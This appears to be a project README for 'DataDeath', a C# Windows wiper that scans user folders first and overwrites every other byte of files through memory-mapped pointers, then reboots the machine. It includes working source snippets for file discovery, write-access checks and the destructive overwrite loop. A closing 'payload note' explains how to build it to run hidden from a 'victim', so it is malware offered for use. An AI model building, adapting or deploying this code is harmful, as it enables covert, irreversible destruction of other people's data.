# DataDeath

**DataDeath** is a highly optimized, multi-threaded C# utility designed for the rapid and unrecoverable destruction of file data on a Windows system. 

Unlike traditional secure wipe tools that perform multiple passes over entire files, DataDeath is engineered for absolute maximum throughput. It achieves this by utilizing a Producer-Consumer pipeline, Memory-Mapped Files, raw `unsafe` memory pointers, and an alternating-byte overwrite pattern to destroy data at the maximum sequential write speed of the host storage drive.

⚠️ **WARNING: THIS TOOL IS HIGHLY DESTRUCTIVE.** 
Running this application will permanently and irreversibly corrupt files on the host system. It is designed to reboot the system immediately upon completion. Do not run this on a machine containing data you wish to keep.

---

## Key Features

*   **Producer-Consumer Architecture**: File scanning and file destruction occur concurrently. The destruction threads do not wait for the scan to finish; they begin mangling files the millisecond they are discovered.
*   **Alternating Byte Destruction**: To halve the required I/O operations, the tool overwrites every other byte of a file with random data. This completely corrupts the file structure and contents while doubling the processing speed.
*   **Zero-Copy Memory Mapping**: Files are not read into application memory buffers. Instead, they are mapped directly to virtual memory using `MemoryMappedFile`, and modified using raw `unsafe` pointers.
*   **Pre-emptive Write-Access Checking**: The scanner verifies write permissions and file locks before queuing a file, ensuring the heavy destruction threads never waste CPU cycles on files they cannot modify.
*   **Thread-Safe Dual-Pane UI**: The console provides real-time, flicker-free updates for both the scanning phase and the destruction phase simultaneously.

---

## Technical Deep Dive

### 1. The Producer-Consumer Pipeline (`Program.cs`)
The core orchestration relies on a `BlockingCollection<string>` with a bounded capacity. This acts as the bridge between the file discovery thread (Producer) and the destruction threads (Consumers).

```csharp
// Bounded collection prevents memory issues if scanning is much faster than destruction
using (BlockingCollection<string> fileQueue = new BlockingCollection<string>(50000))
{
    // Start the scanning process on a background thread (Producer)
    Task scanTask = Task.Run(() =>
    {
        manager.DiscoverFiles(fileQueue);
        fileQueue.CompleteAdding(); 
    });

    // Start the destruction process concurrently (Consumer)
    Task<DestructionResult> destroyTask = FileDestruction.MangleFilesAsync(fileQueue, manager);

    await Task.WhenAll(scanTask, destroyTask);
}
```

### 2. Intelligent File Discovery (`BackupManager.cs`)
The `BackupManager` is responsible for traversing the file system. It prioritizes high-value user directories (Documents, Desktop, Pictures, etc.) before falling back to a general scan of the root drive. 

To optimize the pipeline, it performs a **Write-Access Pre-check**. Before a file is added to the queue, the manager attempts to open a `FileStream` with `FileAccess.Write`. If the file is locked by the OS or lacks permissions, it is silently ignored.

```csharp
private bool HasWriteAccess(string filePath, FileInfo fi)
{
    // ... attribute handling omitted for brevity ...
    try
    {
        // Attempt to open the file for writing to verify permissions and lock status
        using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
        {
            return true;
        }
    }
    catch
    {
        return false; // File is locked or inaccessible
    }
}
```

### 3. High-Speed File Destruction (`FileDestruction.cs`)
This is the most heavily optimized portion of the application. To avoid the massive CPU overhead of standard `FileStream.Seek` and `FileStream.Write` operations, the tool uses **Memory-Mapped Files**.

A single 1MB buffer of random bytes is generated at startup. The destruction threads map the target file into virtual memory in 100MB chunks (to prevent `OutOfMemoryException` on massive files). It then acquires a raw `unsafe` byte pointer to the memory map and writes the random data directly to the virtual memory addresses, skipping every other byte.

```csharp
using (var accessor = mmf.CreateViewAccessor(offset, currentChunkSize, MemoryMappedFileAccess.Write))
{
    unsafe
    {
        byte* ptr = null;
        try
        {
            // Acquire the raw memory pointer to bypass the massive CPU overhead of accessor.Write()
            accessor.SafeMemoryMappedViewHandle.AcquirePointer(ref ptr);
            byte* dataPtr = ptr + accessor.PointerOffset;

            for (long i = 0; i < currentChunkSize; i += 2)
            {
                cancellationToken.ThrowIfCancellationRequested();

                // Write a single byte directly to virtual memory, skipping the next
                dataPtr[i] = _sharedRandomBuffer[bufferIndex];

                bufferIndex += 2;
                if (bufferIndex >= BufferSize) bufferIndex = 0;
            }
        }
        finally
        {
            if (ptr != null) accessor.SafeMemoryMappedViewHandle.ReleasePointer();
        }
    }
}
```
*Note: Progress reporting inside this tight loop is optimized using bitwise operations (`(i & 0xFFFF) == 0`) to only check the `Stopwatch` every 65,536 bytes, completely eliminating CPU bottlenecks.*

### 4. Thread-Safe Console UI
Because both the scanner and multiple destruction threads are reporting progress concurrently, standard `Console.WriteLine` would result in a garbled mess. The application uses a static `_consoleLock` and `Console.SetCursorPosition` to divide the terminal into two distinct, non-overlapping sections that update in real-time.

---

## Build Requirements

*   **Framework**: .NET Framework 4.6.1 (or compatible). 
*   Building this aginst .NET Framework 4.6.1 ensures this can be ran with on Windows builds as early as Windows 10 Version 1511 (Build 10586).
*   **Unsafe Code**: Because `FileDestruction.cs` utilizes raw memory pointers for maximum performance, you must enable unsafe code compilation.
    *   In Visual Studio: `Project Properties -> Build -> Allow unsafe code`.
    *   In `.csproj`: Add `<AllowUnsafeBlocks>true</AllowUnsafeBlocks>` to your `PropertyGroup`.

## Usage

Compile the application in `Release` mode for maximum performance. Upon execution, the program will immediately begin scanning and destroying files. 

*Debug Note: When compiled in `DEBUG` mode, the `AvoidSystemFolders` flag is set to `true`, which prevents the destruction of critical Windows OS files (Windows, Program Files, AppData) to allow for safer testing.*

*Payload note: If building this to be used as a legit payload, be sure to set the Output Type in visual studio to Windows Application, and comment out all the progress reporting code in the Program.Main method. This will result in no window being shown and the code will execute completely hidden from the victim.*